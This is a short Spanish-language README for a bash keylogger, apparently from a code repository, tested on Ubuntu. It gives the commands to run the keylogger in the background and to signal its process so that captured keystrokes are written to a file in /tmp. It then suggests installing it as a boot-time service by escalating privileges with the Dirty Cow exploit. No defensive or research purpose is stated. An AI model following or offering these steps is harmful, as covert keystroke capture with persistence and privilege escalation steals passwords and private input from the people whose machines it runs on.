# bash_keylogger (probado en Ubuntu)
keylogger en bash se debe ejecutar en background:

./keylogger_bash & 



cuando quiera generar el fichero he de mandar una señal al proceso del script, asi:

kill -s SIGUSR1 `ps -C keylogger_bash.sh -o pid --no-headers`

el fichero se genera en /tmp.
Puedes hacer q funcione como un servicio en el arranque. consiguiendo una escalada de privilegios con Dirty Cow
